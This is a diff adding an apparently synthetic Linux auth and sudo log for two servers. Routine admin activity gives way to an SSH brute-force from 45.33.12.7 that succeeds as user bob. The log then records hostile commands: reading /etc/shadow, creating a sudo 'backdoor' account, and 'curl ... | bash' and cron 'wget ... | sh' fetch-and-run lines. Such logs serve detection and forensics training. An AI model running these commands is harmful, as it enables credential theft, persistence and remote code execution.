@@ -1,0 +1,208 @@
+2026-10-26T02:17:00+05:30 web01 CRON[20250]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+2026-10-26T08:06:04+05:30 db01 sshd[20093]: Accepted publickey for bob from 49.205.77.18 port 63784 ssh2
+2026-10-26T08:07:04+05:30 web01 sudo[20125]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+2026-10-26T08:10:04+05:30 web01 sudo[20140]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/docker ps
+2026-10-26T13:23:26+05:30 db01 sshd[20054]: Accepted publickey for alice from 10.10.1.21 port 54180 ssh2
+2026-10-26T13:27:32+05:30 db01 sshd[20015]: Accepted publickey for alice from 10.10.1.21 port 46879 ssh2
+2026-10-26T13:32:22+05:30 db01 sshd[20167]: Accepted publickey for dave from 10.10.1.24 port 40704 ssh2
+2026-10-26T14:07:22+05:30 web01 sshd[20008]: Accepted publickey for alice from 10.10.1.21 port 48358 ssh2
+2026-10-26T14:17:00+05:30 web01 CRON[20277]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+2026-10-26T15:39:14+05:30 web01 sshd[20056]: Accepted publickey for bob from 10.10.1.22 port 50401 ssh2
+2026-10-26T15:40:14+05:30 web01 sudo[20091]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update
+2026-10-26T17:07:15+05:30 db01 sshd[20189]: Accepted publickey for dave from 10.10.1.24 port 43961 ssh2
+2026-10-26T20:42:26+05:30 web01 sshd[20224]: Accepted publickey for dave from 49.37.112.5 port 55736 ssh2
+2026-10-26T21:42:20+05:30 web01 sshd[20208]: Accepted publickey for dave from 10.10.1.24 port 49940 ssh2
+2026-10-27T02:17:00+05:30 web01 CRON[20641]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+2026-10-27T13:17:39+05:30 web01 sshd[20394]: Accepted publickey for bob from 10.10.1.22 port 53201 ssh2
+2026-10-27T13:18:39+05:30 web01 sudo[20417]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+2026-10-27T13:21:39+05:30 web01 sudo[20441]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+2026-10-27T13:24:39+05:30 web01 sudo[20465]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+2026-10-27T13:25:05+05:30 web01 sshd[20314]: Accepted publickey for alice from 10.10.1.21 port 43078 ssh2
+2026-10-27T14:17:00+05:30 web01 CRON[20669]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+2026-10-27T14:35:11+05:30 web01 sshd[20474]: Accepted publickey for dave from 10.10.1.24 port 63568 ssh2
+2026-10-27T14:37:11+05:30 db01 sudo[20513]: dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/systemctl status postgresql
+2026-10-27T16:28:59+05:30 db01 sshd[20372]: Accepted publickey for bob from 49.205.77.18 port 40379 ssh2
+2026-10-27T16:29:59+05:30 web01 sudo[20380]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update
+2026-10-27T16:32:59+05:30 web01 sudo[20390]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+2026-10-27T16:56:05+05:30 db01 sshd[20335]: Accepted publickey for alice from 10.10.1.21 port 42808 ssh2
+2026-10-27T17:27:16+05:30 db01 sshd[20527]: Failed password for dave from 10.10.1.24 port 59062 ssh2
+2026-10-27T17:27:22+05:30 db01 sshd[20548]: Accepted password for dave from 10.10.1.24 port 41284 ssh2
+2026-10-27T18:21:58+05:30 web01 sshd[20580]: Accepted publickey for dave from 10.10.1.24 port 41821 ssh2
+2026-10-27T21:55:14+05:30 db01 sshd[20586]: Accepted publickey for dave from 10.10.1.24 port 55366 ssh2
+2026-10-27T21:57:14+05:30 db01 sudo[20610]: dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/systemctl status postgresql
+2026-10-28T02:17:00+05:30 web01 CRON[21046]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+2026-10-28T08:34:57+05:30 web01 sshd[20780]: Failed password for bob from 10.10.1.22 port 56696 ssh2
+2026-10-28T08:35:03+05:30 web01 sshd[20810]: Accepted password for bob from 10.10.1.22 port 50931 ssh2
+2026-10-28T08:35:57+05:30 web01 sudo[20830]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+2026-10-28T08:38:57+05:30 web01 sudo[20838]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+2026-10-28T08:41:57+05:30 web01 sudo[20878]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+2026-10-28T09:03:02+05:30 db01 sshd[20894]: Accepted publickey for bob from 10.10.1.22 port 49220 ssh2
+2026-10-28T09:04:02+05:30 web01 sudo[20905]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+2026-10-28T09:27:07+05:30 web01 sshd[20694]: Accepted publickey for alice from 10.10.1.21 port 47647 ssh2
+2026-10-28T11:47:50+05:30 web01 sshd[20706]: Accepted publickey for bob from 10.10.1.22 port 63359 ssh2
+2026-10-28T11:48:50+05:30 web01 sudo[20715]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update
+2026-10-28T11:51:50+05:30 web01 sudo[20734]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update
+2026-10-28T11:54:50+05:30 web01 sudo[20745]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+2026-10-28T11:57:50+05:30 web01 sudo[20771]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+2026-10-28T11:59:54+05:30 web01 sshd[21008]: Accepted publickey for dave from 49.37.112.5 port 53118 ssh2
+2026-10-28T12:09:54+05:30 db01 sshd[20692]: Accepted publickey for alice from 10.10.1.21 port 51279 ssh2
+2026-10-28T13:24:15+05:30 web01 sshd[20996]: Accepted publickey for dave from 10.10.1.24 port 62899 ssh2
+2026-10-28T14:17:00+05:30 web01 CRON[21086]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+2026-10-28T14:23:09+05:30 web01 sshd[20922]: Failed password for dave from 49.37.112.5 port 53332 ssh2
+2026-10-28T14:23:15+05:30 web01 sshd[20950]: Accepted password for dave from 49.37.112.5 port 52831 ssh2
+2026-10-28T14:25:09+05:30 db01 sudo[20957]: dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/systemctl status postgresql
+2026-10-29T02:17:00+05:30 web01 CRON[21426]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+2026-10-29T09:48:21+05:30 db01 sshd[21164]: Accepted publickey for alice from 10.10.1.21 port 53263 ssh2
+2026-10-29T10:15:01+05:30 db01 sshd[21117]: Accepted publickey for alice from 10.10.1.21 port 47238 ssh2
+2026-10-29T11:03:44+05:30 web01 sshd[21128]: Accepted publickey for alice from 10.10.1.21 port 49071 ssh2
+2026-10-29T11:40:18+05:30 db01 sshd[21193]: Failed password for bob from 49.205.77.18 port 47984 ssh2
+2026-10-29T11:40:24+05:30 db01 sshd[21211]: Accepted password for bob from 49.205.77.18 port 52052 ssh2
+2026-10-29T11:41:18+05:30 web01 sudo[21234]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+2026-10-29T11:44:18+05:30 web01 sudo[21235]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+2026-10-29T11:47:18+05:30 web01 sudo[21270]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+2026-10-29T12:37:24+05:30 db01 sshd[21274]: Failed password for bob from 10.10.1.22 port 49334 ssh2
+2026-10-29T12:37:30+05:30 db01 sshd[21306]: Accepted password for bob from 10.10.1.22 port 61706 ssh2
+2026-10-29T12:38:24+05:30 web01 sudo[21341]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+2026-10-29T12:41:24+05:30 web01 sudo[21345]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update
+2026-10-29T12:44:24+05:30 web01 sudo[21385]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/docker ps
+2026-10-29T13:18:40+05:30 db01 sshd[21131]: Accepted publickey for alice from 10.10.1.21 port 59989 ssh2
+2026-10-29T13:27:27+05:30 web01 sshd[21403]: Accepted publickey for dave from 49.37.112.5 port 43129 ssh2
+2026-10-29T14:17:00+05:30 web01 CRON[21436]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+2026-10-29T19:23:18+05:30 web01 sshd[21393]: Accepted publickey for dave from 10.10.1.24 port 60605 ssh2
+2026-10-30T02:17:00+05:30 web01 CRON[22010]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+2026-10-30T10:06:14+05:30 web01 sshd[21755]: Accepted publickey for bob from 49.205.77.18 port 43374 ssh2
+2026-10-30T10:07:14+05:30 web01 sudo[21791]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update
+2026-10-30T10:10:14+05:30 web01 sudo[21792]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update
+2026-10-30T11:03:07+05:30 web01 sshd[21813]: Accepted publickey for bob from 10.10.1.22 port 41569 ssh2
+2026-10-30T11:04:07+05:30 web01 sudo[21848]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+2026-10-30T11:18:42+05:30 web01 sshd[21460]: Accepted publickey for alice from 10.10.1.21 port 44503 ssh2
+2026-10-30T13:33:16+05:30 db01 sshd[21470]: Accepted publickey for alice from 10.10.1.21 port 50770 ssh2
+2026-10-30T14:16:43+05:30 db01 sshd[21497]: Failed password for bob from 49.205.77.18 port 61013 ssh2
+2026-10-30T14:16:49+05:30 db01 sshd[21524]: Accepted password for bob from 49.205.77.18 port 60673 ssh2
+2026-10-30T14:17:00+05:30 web01 CRON[22043]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+2026-10-30T14:17:43+05:30 web01 sudo[21555]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+2026-10-30T14:20:43+05:30 web01 sudo[21567]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/docker ps
+2026-10-30T14:23:43+05:30 web01 sudo[21599]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/docker ps
+2026-10-30T14:26:43+05:30 web01 sudo[21604]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+2026-10-30T14:30:44+05:30 web01 sshd[21634]: Accepted publickey for bob from 10.10.1.22 port 59919 ssh2
+2026-10-30T14:31:44+05:30 web01 sudo[21656]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+2026-10-30T14:34:44+05:30 web01 sudo[21682]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+2026-10-30T14:37:44+05:30 web01 sudo[21694]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update
+2026-10-30T14:40:44+05:30 web01 sudo[21716]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+2026-10-30T14:48:24+05:30 db01 sshd[21999]: Accepted publickey for dave from 10.10.1.24 port 49919 ssh2
+2026-10-30T15:02:28+05:30 db01 sshd[21481]: Accepted publickey for alice from 10.10.1.21 port 54639 ssh2
+2026-10-30T15:37:09+05:30 web01 sshd[21438]: Accepted publickey for alice from 10.10.1.21 port 41580 ssh2
+2026-10-30T16:45:35+05:30 web01 sshd[21955]: Accepted publickey for dave from 10.10.1.24 port 44669 ssh2
+2026-10-30T16:47:35+05:30 db01 sudo[21974]: dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/systemctl status postgresql
+2026-10-30T18:19:44+05:30 db01 sshd[21861]: Accepted publickey for bob from 10.10.1.22 port 49362 ssh2
+2026-10-30T18:20:44+05:30 web01 sudo[21886]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/docker ps
+2026-10-30T18:23:44+05:30 web01 sudo[21899]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+2026-10-30T18:26:44+05:30 web01 sudo[21909]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update
+2026-10-30T18:29:44+05:30 web01 sudo[21919]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/docker ps
+2026-10-31T02:17:00+05:30 web01 CRON[22232]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+2026-10-31T11:41:52+05:30 db01 sshd[22146]: Accepted publickey for alice from 10.10.1.21 port 53413 ssh2
+2026-10-31T12:32:28+05:30 web01 sshd[22116]: Accepted publickey for alice from 10.10.1.21 port 57922 ssh2
+2026-10-31T12:40:10+05:30 web01 sshd[22127]: Accepted publickey for alice from 10.10.1.21 port 51909 ssh2
+2026-10-31T12:41:23+05:30 web01 sshd[22180]: Accepted publickey for dave from 10.10.1.24 port 54481 ssh2
+2026-10-31T12:43:23+05:30 db01 sudo[22188]: dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/systemctl status postgresql
+2026-10-31T13:11:50+05:30 db01 sshd[22230]: Accepted publickey for dave from 10.10.1.24 port 64528 ssh2
+2026-10-31T14:16:40+05:30 db01 sshd[22077]: Accepted publickey for alice from 10.10.1.21 port 49189 ssh2
+2026-10-31T14:17:00+05:30 web01 CRON[22254]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+2026-10-31T15:19:38+05:30 web01 sshd[22206]: Accepted publickey for dave from 49.37.112.5 port 58137 ssh2
+2026-10-31T17:15:46+05:30 web01 sshd[22106]: Failed password for alice from 10.10.1.21 port 64561 ssh2
+2026-10-31T17:15:52+05:30 web01 sshd[22113]: Accepted password for alice from 10.10.1.21 port 56933 ssh2
+2026-10-31T17:21:39+05:30 db01 sshd[22154]: Accepted publickey for dave from 10.10.1.24 port 48348 ssh2
+2026-10-31T17:45:10+05:30 web01 sshd[22164]: Accepted publickey for dave from 49.37.112.5 port 44821 ssh2
+2026-11-01T02:17:00+05:30 web01 CRON[22554]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+2026-11-01T08:31:57+05:30 web01 sshd[22290]: Accepted publickey for bob from 10.10.1.22 port 64196 ssh2
+2026-11-01T08:32:57+05:30 web01 sudo[22297]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+2026-11-01T10:27:05+05:30 web01 sshd[22298]: Accepted publickey for bob from 10.10.1.22 port 58615 ssh2
+2026-11-01T10:28:05+05:30 web01 sudo[22301]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+2026-11-01T10:31:05+05:30 web01 sudo[22333]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/docker ps
+2026-11-01T10:34:05+05:30 web01 sudo[22356]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update
+2026-11-01T11:36:59+05:30 db01 sshd[22505]: Accepted publickey for bob from 49.205.77.18 port 46096 ssh2
+2026-11-01T11:37:59+05:30 web01 sudo[22535]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+2026-11-01T14:17:00+05:30 web01 CRON[22562]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+2026-11-01T14:36:35+05:30 db01 sshd[22385]: Accepted publickey for bob from 10.10.1.22 port 57053 ssh2
+2026-11-01T14:37:35+05:30 web01 sudo[22399]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/docker ps
+2026-11-01T14:40:35+05:30 web01 sudo[22436]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+2026-11-01T14:43:35+05:30 web01 sudo[22471]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update
+2026-11-01T16:02:48+05:30 db01 sshd[22371]: Accepted publickey for bob from 49.205.77.18 port 59918 ssh2
+2026-11-01T16:03:48+05:30 web01 sudo[22382]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+2026-11-02T02:11:51+05:30 web01 sshd[22581]: Invalid user admin from 45.33.12.7 port 44967
+2026-11-02T02:11:51+05:30 web01 sshd[22592]: Failed password for invalid user admin from 45.33.12.7 port 40954 ssh2
+2026-11-02T02:11:54+05:30 web01 sshd[22600]: Failed password for bob from 45.33.12.7 port 59932 ssh2
+2026-11-02T02:11:58+05:30 web01 sshd[22607]: Failed password for root from 45.33.12.7 port 44155 ssh2
+2026-11-02T02:12:01+05:30 web01 sshd[22643]: Invalid user admin from 45.33.12.7 port 58135
+2026-11-02T02:12:01+05:30 web01 sshd[22660]: Failed password for invalid user admin from 45.33.12.7 port 57312 ssh2
+2026-11-02T02:12:04+05:30 web01 sshd[22683]: Failed password for root from 45.33.12.7 port 41113 ssh2
+2026-11-02T02:12:05+05:30 web01 sshd[22702]: Invalid user git from 45.33.12.7 port 49516
+2026-11-02T02:12:05+05:30 web01 sshd[22739]: Failed password for invalid user git from 45.33.12.7 port 50805 ssh2
+2026-11-02T02:12:07+05:30 web01 sshd[22756]: Failed password for root from 45.33.12.7 port 57452 ssh2
+2026-11-02T02:12:10+05:30 web01 sshd[22783]: Failed password for root from 45.33.12.7 port 54847 ssh2
+2026-11-02T02:12:12+05:30 web01 sshd[22785]: Invalid user git from 45.33.12.7 port 52967
+2026-11-02T02:12:12+05:30 web01 sshd[22814]: Failed password for invalid user git from 45.33.12.7 port 41888 ssh2
+2026-11-02T02:12:16+05:30 web01 sshd[22833]: Invalid user test from 45.33.12.7 port 50391
+2026-11-02T02:12:16+05:30 web01 sshd[22846]: Failed password for invalid user test from 45.33.12.7 port 47480 ssh2
+2026-11-02T02:12:18+05:30 web01 sshd[22874]: Failed password for root from 45.33.12.7 port 46003 ssh2
+2026-11-02T02:12:20+05:30 web01 sshd[22893]: Invalid user test from 45.33.12.7 port 41618
+2026-11-02T02:12:20+05:30 web01 sshd[22933]: Failed password for invalid user test from 45.33.12.7 port 46807 ssh2
+2026-11-02T02:12:24+05:30 web01 sshd[22944]: Failed password for root from 45.33.12.7 port 43136 ssh2
+2026-11-02T02:12:26+05:30 web01 sshd[22948]: Failed password for root from 45.33.12.7 port 52031 ssh2
+2026-11-02T02:12:30+05:30 web01 sshd[22985]: Invalid user admin from 45.33.12.7 port 57521
+2026-11-02T02:12:30+05:30 web01 sshd[22992]: Failed password for invalid user admin from 45.33.12.7 port 46218 ssh2
+2026-11-02T02:12:32+05:30 web01 sshd[23016]: Invalid user oracle from 45.33.12.7 port 44188
+2026-11-02T02:12:32+05:30 web01 sshd[23043]: Failed password for invalid user oracle from 45.33.12.7 port 56299 ssh2
+2026-11-02T02:12:33+05:30 web01 sshd[23050]: Invalid user git from 45.33.12.7 port 62638
+2026-11-02T02:12:33+05:30 web01 sshd[23075]: Failed password for invalid user git from 45.33.12.7 port 54234 ssh2
+2026-11-02T02:12:35+05:30 web01 sshd[23080]: Invalid user deploy from 45.33.12.7 port 64603
+2026-11-02T02:12:35+05:30 web01 sshd[23111]: Failed password for invalid user deploy from 45.33.12.7 port 64880 ssh2
+2026-11-02T02:12:37+05:30 web01 sshd[23127]: Failed password for bob from 45.33.12.7 port 40620 ssh2
+2026-11-02T02:12:39+05:30 web01 sshd[23166]: Invalid user test from 45.33.12.7 port 63973
+2026-11-02T02:12:39+05:30 web01 sshd[23200]: Failed password for invalid user test from 45.33.12.7 port 40569 ssh2
+2026-11-02T02:12:43+05:30 web01 sshd[23239]: Failed password for root from 45.33.12.7 port 54668 ssh2
+2026-11-02T02:12:45+05:30 web01 sshd[23254]: Invalid user test from 45.33.12.7 port 63693
+2026-11-02T02:12:45+05:30 web01 sshd[23270]: Failed password for invalid user test from 45.33.12.7 port 64203 ssh2
+2026-11-02T02:12:48+05:30 web01 sshd[23299]: Invalid user oracle from 45.33.12.7 port 46011
+2026-11-02T02:12:48+05:30 web01 sshd[23302]: Failed password for invalid user oracle from 45.33.12.7 port 64358 ssh2
+2026-11-02T02:12:50+05:30 web01 sshd[23321]: Invalid user deploy from 45.33.12.7 port 64269
+2026-11-02T02:12:50+05:30 web01 sshd[23325]: Failed password for invalid user deploy from 45.33.12.7 port 62882 ssh2
+2026-11-02T02:12:52+05:30 web01 sshd[23354]: Invalid user git from 45.33.12.7 port 45246
+2026-11-02T02:12:52+05:30 web01 sshd[23381]: Failed password for invalid user git from 45.33.12.7 port 56481 ssh2
+2026-11-02T02:12:54+05:30 web01 sshd[23390]: Invalid user git from 45.33.12.7 port 44741
+2026-11-02T02:12:54+05:30 web01 sshd[23397]: Failed password for invalid user git from 45.33.12.7 port 48471 ssh2
+2026-11-02T02:12:55+05:30 web01 sshd[23409]: Invalid user test from 45.33.12.7 port 62205
+2026-11-02T02:12:55+05:30 web01 sshd[23439]: Failed password for invalid user test from 45.33.12.7 port 57948 ssh2
+2026-11-02T02:12:59+05:30 web01 sshd[23443]: Failed password for ubuntu from 45.33.12.7 port 61222 ssh2
+2026-11-02T02:13:02+05:30 web01 sshd[23455]: Invalid user admin from 45.33.12.7 port 44605
+2026-11-02T02:13:02+05:30 web01 sshd[23486]: Failed password for invalid user admin from 45.33.12.7 port 55149 ssh2
+2026-11-02T02:13:06+05:30 web01 sshd[23512]: Invalid user deploy from 45.33.12.7 port 59467
+2026-11-02T02:13:06+05:30 web01 sshd[23532]: Failed password for invalid user deploy from 45.33.12.7 port 52250 ssh2
+2026-11-02T02:13:10+05:30 web01 sshd[23554]: Invalid user deploy from 45.33.12.7 port 53994
+2026-11-02T02:13:10+05:30 web01 sshd[23592]: Failed password for invalid user deploy from 45.33.12.7 port 62974 ssh2
+2026-11-02T02:13:12+05:30 web01 sshd[23613]: Invalid user oracle from 45.33.12.7 port 45998
+2026-11-02T02:13:12+05:30 web01 sshd[23650]: Failed password for invalid user oracle from 45.33.12.7 port 51252 ssh2
+2026-11-02T02:13:14+05:30 web01 sshd[23656]: Failed password for bob from 45.33.12.7 port 54341 ssh2
+2026-11-02T02:13:18+05:30 web01 sshd[23694]: Invalid user test from 45.33.12.7 port 40046
+2026-11-02T02:13:18+05:30 web01 sshd[23707]: Failed password for invalid user test from 45.33.12.7 port 41852 ssh2
+2026-11-02T02:13:22+05:30 web01 sshd[23736]: Failed password for bob from 45.33.12.7 port 50908 ssh2
+2026-11-02T02:13:26+05:30 web01 sshd[23761]: Invalid user oracle from 45.33.12.7 port 61447
+2026-11-02T02:13:26+05:30 web01 sshd[23770]: Failed password for invalid user oracle from 45.33.12.7 port 58483 ssh2
+2026-11-02T02:13:27+05:30 web01 sshd[23796]: Failed password for root from 45.33.12.7 port 59395 ssh2
+2026-11-02T02:13:30+05:30 web01 sshd[23827]: Failed password for bob from 45.33.12.7 port 63565 ssh2
+2026-11-02T02:13:32+05:30 web01 sshd[23838]: Invalid user deploy from 45.33.12.7 port 60751
+2026-11-02T02:13:32+05:30 web01 sshd[23866]: Failed password for invalid user deploy from 45.33.12.7 port 62260 ssh2
+2026-11-02T02:13:36+05:30 web01 sshd[23881]: Invalid user oracle from 45.33.12.7 port 49348
+2026-11-02T02:13:36+05:30 web01 sshd[23883]: Failed password for invalid user oracle from 45.33.12.7 port 47207 ssh2
+2026-11-02T02:13:38+05:30 web01 sshd[23896]: Failed password for root from 45.33.12.7 port 43872 ssh2
+2026-11-02T02:13:41+05:30 web01 sshd[23906]: Failed password for root from 45.33.12.7 port 51774 ssh2
+2026-11-02T02:13:44+05:30 web01 sshd[23928]: Accepted password for bob from 45.33.12.7 port 58908 ssh2
+2026-11-02T02:14:44+05:30 web01 sudo[23937]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/id
+2026-11-02T02:15:37+05:30 web01 sudo[23976]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+2026-11-02T02:16:34+05:30 web01 sudo[23990]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash backdoor
+2026-11-02T02:16:54+05:30 web01 useradd[24018]: new user: name=backdoor, UID=1007, GID=1007, home=/home/backdoor, shell=/bin/bash, from=/dev/pts/0
+2026-11-02T02:17:24+05:30 web01 sudo[24048]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo backdoor
+2026-11-02T02:17:25+05:30 web01 usermod[24068]: add 'backdoor' to group 'sudo'
+2026-11-02T02:18:05+05:30 web01 sudo[24077]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash -c curl -s http://45.33.12.7/x.sh | bash
+2026-11-02T02:18:55+05:30 web01 sudo[24088]: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/crontab -l
+2026-11-02T02:19:15+05:30 web01 CRON[24110]: (root) CMD (wget -q -O- http://45.33.12.7/beacon | sh)
